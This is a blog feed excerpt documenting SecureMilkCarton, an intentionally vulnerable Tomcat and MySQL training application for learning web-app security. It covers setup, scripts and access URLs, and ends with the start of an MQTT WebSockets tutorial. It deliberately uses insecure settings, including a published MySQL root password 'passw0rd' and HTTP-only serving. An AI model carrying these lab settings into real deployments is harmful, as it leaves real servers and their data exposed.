&lt;h2 id=&quot;securemilkcarton-web-server-configuration&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#securemilkcarton-web-server-configuration&quot; aria-label=&quot;securemilkcarton web server configuration permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;SecureMilkCarton: Web Server Configuration&lt;/h2&gt;
&lt;p&gt;An SSH server has been installed using the OpenSSH software. However, no configuration has been performed. You can log in to the SSH service on port 22. The login details are any user account that has been created on the virtual machine.&lt;/p&gt;
&lt;p&gt;A MySQL database has been installed and partially configured. The credentials for the MySQL database are:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Username: &lt;code class=&quot;language-text&quot;&gt;root&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Password: &lt;code class=&quot;language-text&quot;&gt;passw0rd&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Apache TomCat (a type of web server software) has also been installed on the server. The TomCat service is a Java Servlet Container – basically, a web server that allows the creation and sharing (via HTTP) of a web application written with Java on the server-side. Although the web application is very simple (compared to real-world web applications), getting used to the setup can take some practice. Here is some relevant information about the web application configuration:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The web application is deployed in: &lt;code class=&quot;language-text&quot;&gt;/opt/tomcat/webapps/&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;The name of the web application is: &lt;code class=&quot;language-text&quot;&gt;securemilkcarton&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;The full location of the web application is: &lt;code class=&quot;language-text&quot;&gt;/opt/tomcat/webapps/securemilkcarton&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;securemilkcarton-project-structure&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#securemilkcarton-project-structure&quot; aria-label=&quot;securemilkcarton project structure permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;SecureMilkCarton: Project Structure&lt;/h2&gt;
&lt;p&gt;The directory structure of the web application is very important to learn and understand to make good progress with the assignment. The following directory structure represents the web application:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;index.jsp&lt;/code&gt;: the HTML code for the login web page&lt;/li&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;search.jsp&lt;/code&gt;: the HTML code for the employee search web page&lt;/li&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;noticeboard.jsp&lt;/code&gt;: the HTML code for the noticeboard web page&lt;/li&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;style.css&lt;/code&gt;: the CSS stylesheet for the website&lt;/li&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;jquery.js&lt;/code&gt;: the JQuery library dependency for the noticeboard web page&lt;/li&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;securemilkcarton_logo.jpg&lt;/code&gt;: the company logo to make things look pretty&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;WEB-INF&lt;/code&gt;: a folder containing web application resources&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;classes&lt;/code&gt;: a folder containing java code&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;Login.java&lt;/code&gt;: server-side code for the login web page&lt;/li&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;Noticeboard.java&lt;/code&gt;: server-side code for the noticeboard page&lt;/li&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;Hashing.java&lt;/code&gt;: server-side code for password hashing&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;lib&lt;/code&gt;: a folder containing dependencies&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;mysql-connector-java-5.1.42-bin.jar&lt;/code&gt;: dependency jar file to connect to local MySQL database&lt;/li&gt;
&lt;li&gt;Other dependencies can be included in this folder&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;database&lt;/code&gt;: a collection of files for database creation and re-creation:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;securemilkcarton_db.sql&lt;/code&gt;: an SQL file containing all securemilkcarton database entries&lt;/li&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;create_db.sh&lt;/code&gt;: this script uses &lt;code class=&quot;language-text&quot;&gt;securemilkcarton_db.sql&lt;/code&gt; to automate creating the database&lt;/li&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;recreate_db.sh&lt;/code&gt;: this script deletes the old database and recreates the original database using the &lt;code class=&quot;language-text&quot;&gt;securemilkcarton_db.sql&lt;/code&gt; file&lt;/li&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;passwords.csv&lt;/code&gt;: a comma-separated values (CSV) file containing usernames, passwords and salt values. This file is useful when changing the password hashing algorithm&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;scripts&lt;/code&gt;: a collection of scripts that make life easier:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;compile.sh&lt;/code&gt;: a script to compile the Java source code and package the entire web application into a distributable .war file for deployment to the Tomcat server&lt;/li&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;compile_simple.sh&lt;/code&gt;: the same script contents as &lt;code class=&quot;language-text&quot;&gt;compile.sh&lt;/code&gt; file, but with the code commenting and error checking removed&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;securemilkcarton-general-usage&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#securemilkcarton-general-usage&quot; aria-label=&quot;securemilkcarton general usage permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;SecureMilkCarton: General Usage&lt;/h2&gt;
&lt;p&gt;This section documents several common scenarios that you will need to perform including creating the database for the web application, deleting the database, compiling the web application and how to access the web application.&lt;/p&gt;
&lt;h3 id=&quot;how-to-create-the-database&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#how-to-create-the-database&quot; aria-label=&quot;how to create the database permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;How to create the database&lt;/h3&gt;
&lt;p&gt;The database is essential for the SecureMilkCarton web application to function. Therefore, creating a database is a key step. This process can be automated using the &lt;code class=&quot;language-text&quot;&gt;create_db.sh&lt;/code&gt; script provided in the &lt;code class=&quot;language-text&quot;&gt;securemilkcarton/databases&lt;/code&gt; folder. Simply run the script using the following command (the following instructions assumes you have the repo in your home folder):&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;cd ~/SecureMilkCarton/securemilkcarton/databases
./create_db.sh &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;You will be prompted to enter the password for the root user of the database account. If you followed the official documentation, this password will be: &lt;code class=&quot;language-text&quot;&gt;passw0rd&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;The primary action the script performs is depicted in the following code snippet:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;cat ~/SecureMilkCarton/securemilkcarton/database/securemilkcarton_db.sql | mysql -u root -p&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This line of code prints the contents of &lt;code class=&quot;language-text&quot;&gt;securemilkcarton_db.sql&lt;/code&gt; file containing the database contents, and pipes the content into the &lt;code class=&quot;language-text&quot;&gt;mysql&lt;/code&gt; command which populates the database.&lt;/p&gt;
&lt;h3 id=&quot;how-to-delete-and-recreate-the-database&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#how-to-delete-and-recreate-the-database&quot; aria-label=&quot;how to delete and recreate the database permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;How to delete and recreate the database&lt;/h3&gt;
&lt;p&gt;Similar to creating the database, you can also recreate the database using the same &lt;code class=&quot;language-text&quot;&gt;securemilkcarton_db.sql&lt;/code&gt; file. However, be warned… this script drops the entire &lt;code class=&quot;language-text&quot;&gt;securemilkcarton&lt;/code&gt; database and all entries. If you have made any modifications to the database contents, this information will be lost.&lt;/p&gt;
&lt;p&gt;Recreating the database can be automated using the &lt;code class=&quot;language-text&quot;&gt;recreate_db.sh&lt;/code&gt; script provided in the &lt;code class=&quot;language-text&quot;&gt;securemilkcarton/databases&lt;/code&gt; folder. Simply run the script using the following command (the following instructions assumes you have the repo in your home folder):&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;cd ~/SecureMilkCarton/securemilkcarton/databases
./create_db.sh &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;You will be prompted to enter the password for the root user of the database account. If you followed the official documentation, this password will be: &lt;code class=&quot;language-text&quot;&gt;passw0rd&lt;/code&gt;. The first time you are prompted for the password is to drop the database, the second time you are prompted for the password is to create the database again.&lt;/p&gt;
&lt;h3 id=&quot;how-to-compile-and-deploy&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#how-to-compile-and-deploy&quot; aria-label=&quot;how to compile and deploy permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;How to compile and deploy&lt;/h3&gt;
&lt;p&gt;This project uses a simple static technique to compile and deploy a Tomcat web application. This process can be automated using the &lt;code class=&quot;language-text&quot;&gt;compile.sh&lt;/code&gt; script provided in the &lt;code class=&quot;language-text&quot;&gt;securemilkcarton/scripts&lt;/code&gt; folder. Simply run the script using the following command (the following instructions assumes you have the repo in your home folder):&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;cd ~/SecureMilkCarton/securemilkcarton/scripts
sudo ./compile.sh &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Make sure you &lt;em&gt;use sudo to compile&lt;/em&gt; the web application!&lt;/p&gt;
&lt;p&gt;Below is a snippet of the primary code that compiles and deploys the web application, which includes some comments to explain what each line achieves.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;# Compile each of the three .java files
javac -classpath &quot;/opt/tomcat/lib/servlet-api.jar&quot; ~/SecureMilkCarton/securemilkcarton/WEB-INF/classes/Login.java ~/SecureMilkCarton/securemilkcarton/WEB-INF/classes/Hashing.java
javac -classpath &quot;/opt/tomcat/lib/servlet-api.jar&quot; ~/SecureMilkCarton/securemilkcarton/WEB-INF/classes/Noticeboard.java

# Create a .war file to export to the Java Tomcat web server
jar -cf securemilkcarton.war *

# Copy the .war file to the Java Tomcat web server
sudo cp securemilkcarton.war /opt/tomcat/webapps/&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&quot;how-to-access-the-web-application&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#how-to-access-the-web-application&quot; aria-label=&quot;how to access the web application permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;How to access the web application&lt;/h3&gt;
&lt;p&gt;The web application is accessible through any web browser, however, it is recommended to use Mozilla Firefox or Google Chrome. The specific ports the web application are deployed on are:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;HTTP on port 8080&lt;/li&gt;
&lt;li&gt;HTTPS on port 8443 (not configured by default)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Therefore, you can access the web application by using the following URL in your web browser:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;lt;server-ip-address&gt;:8080/securemilkcarton/&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;For example: &lt;code class=&quot;language-text&quot;&gt;192.168.1.10:8080/securemilkcarton/&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;If you performed the optional step of changing the default ports you can access the web application using the following URL in your web browser:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;lt;server-ip-address&gt;/securemilkcarton/&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;For example: &lt;code class=&quot;language-text&quot;&gt;192.168.1.10/securemilkcarton/&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Since SecureMilkCarton is a vulnerable and terribly configured, web application it is not served using HTTPS by default. If you do implement HTTPS certificates, the web application will then be accessible using the following URLs:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;https://&amp;lt;server-ip-address&gt;:8443/securemilkcarton/&lt;/code&gt; (if using port 8443)&lt;/li&gt;
&lt;li&gt;For example: &lt;code class=&quot;language-text&quot;&gt;192.168.1.10:8443/securemilkcarton/&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;https://&amp;lt;server-ip-address&gt;/securemilkcarton/&lt;/code&gt; (if using port 443)&lt;/li&gt;
&lt;li&gt;For example: &lt;code class=&quot;language-text&quot;&gt;https://192.168.1.10/securemilkcarton/&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;conclusion&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#conclusion&quot; aria-label=&quot;conclusion permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;The entire point of the SecureMilkCarton project was to share the work. I designed it because I was unable to find any similar (robust) projects for learning how to secure web applications. With that being said, please feel free to contact me or post a comment if you would like to know anything about the project. Like I previously mentioned, also check out the &lt;a href=&quot;https://github.com/thomaslaurenson/SecureMilkCarton&quot;&gt;SecureMilkCarton repository&lt;/a&gt; to obtain the source code or review the technical documentation.&lt;/p&gt;</content:encoded></item><item><title><![CDATA[MQTT Web App using JavaScript and WebSockets]]></title><description><![CDATA[This post outlines a tutorial and explanation of how to use the Paho MQTT JavaScript library to build a basic web application to subscribe…]]></description><link>https://thomaslaurenson.com/blog/2018-07-10/mqtt-web-app-using-javascript-and-websockets/</link><guid isPermaLink="false">https://thomaslaurenson.com/blog/2018-07-10/mqtt-web-app-using-javascript-and-websockets/</guid><pubDate>Tue, 10 Jul 2018 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;This post outlines a tutorial and explanation of how to use the Paho MQTT JavaScript library to build a basic web application to subscribe to MQTT messages from a broker. The resultant source code is available from the following repository: &lt;a href=&quot;https://github.com/thomaslaurenson/MQTT-Subscription-Examples&quot;&gt;js-mtt-websockets-demo&lt;/a&gt;. Please feel free to use it as a base in your project. The final web application is simple, yet functional.&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 630px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/d2a752d9f8764bba14d5e766a602af96/705cc/styled-web-application.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 77.84810126582278%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAYAAAAWGF8bAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABuklEQVQ4y51TXU/CMBTlX5uIEeK7Row/AhNCwiMSQnyRgHwE2IOOhAQRcAP2veFg27HtKOB0gt7kpOt6e3rO7W3i/qGJ0czAy1DCq2ygWHnCSfISZ+kbJNMZJFMZ8p1h8yjo2mnqGucXtzg5u0JXEJGQ32XoqgpD1+DYFsZvE9TqbVSrDdRqLTI20Wr10Os9o0uwG1/Qbgt4JHmNRoeMTYwnEhLYhEJIO50O+n0Rs/kM/wln+UEJAzbRdR2iKGI4HGIwGGBJFoMggOd5BH4MPPi+z/JWaw+mZe8U2rYNSZKgKiohW2K1Wh0FSkqDHmDazo7Qsiymkp5Ik9br9VGIJdQ0jSiUWcK+gkOEVMA3QloDirjgSqL4WeGGaDQaIZfLIZ/Po1KpoFAoIJu9gyAIbJ0XPwoenr9VGP6cTqcolUool8uo1+uMtFgskjbqs41xll3XpR73CTcnbKT/xTKFaZrhRfoBaZs9Qt4C3ApN4jZ/bWbHQcAJ7Qghv7GfahVXvy+E1vaWQ8JDauIUhpb9qGWXFdg7sqE56AtjogiYZc0gL8S0oWgG5LmC2UI9GvJCwVzRwv26CYO85U8/bsIxdfMNjQAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;img
        class=&quot;gatsby-resp-image-image&quot;
        alt=&quot;The completed web application&quot;
        title=&quot;The completed web application&quot;
        src=&quot;/static/d2a752d9f8764bba14d5e766a602af96/f058b/styled-web-application.png&quot;
        srcset=&quot;/static/d2a752d9f8764bba14d5e766a602af96/c26ae/styled-web-application.png 158w,
/static/d2a752d9f8764bba14d5e766a602af96/6bdcf/styled-web-application.png 315w,
/static/d2a752d9f8764bba14d5e766a602af96/f058b/styled-web-application.png 630w,
/static/d2a752d9f8764bba14d5e766a602af96/40601/styled-web-application.png 945w,
/static/d2a752d9f8764bba14d5e766a602af96/705cc/styled-web-application.png 1071w&quot;
        sizes=&quot;(max-width: 630px) 100vw, 630px&quot;
        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
        loading=&quot;lazy&quot;
      /&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&quot;contents&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#contents&quot; aria-label=&quot;contents permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Contents&lt;/h2&gt;
&lt;div class=&quot;table-of-contents&quot;&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#introduction&quot;&gt;Introduction&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#the-eclipse-paho-mqtt-javascript-library&quot;&gt;The Eclipse Paho MQTT JavaScript Library&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#mqtt-over-websockets&quot;&gt;MQTT Over Websockets&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#building-an-mqtt-web-application&quot;&gt;Building an MQTT Web Application&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#creating-the-html-page&quot;&gt;Creating the HTML Page&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#creating-the-javascript-code-for-mqtt&quot;&gt;Creating the JavaScript Code for MQTT&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#styling-the-web-application&quot;&gt;Styling the Web Application&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#conclusion&quot;&gt;Conclusion&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;h2 id=&quot;introduction&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#introduction&quot; aria-label=&quot;introduction permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Introduction&lt;/h2&gt;
&lt;p&gt;MQTT is a machine-to-machine connectivity/communication protocol. So what does this mean? MQTT is used by machines (think computer programs) for the transfer of data (think messages). Although MQTT has several uses, it is exceptionally prominent in the &lt;em&gt;Internet of Things&lt;/em&gt;. The technology suits IoT because it is exceptionally lightweight and provides the functionality to subscribe and publish messages. And, of course, it suits IoT because it is naturally a machine-to-machine network.&lt;/p&gt;
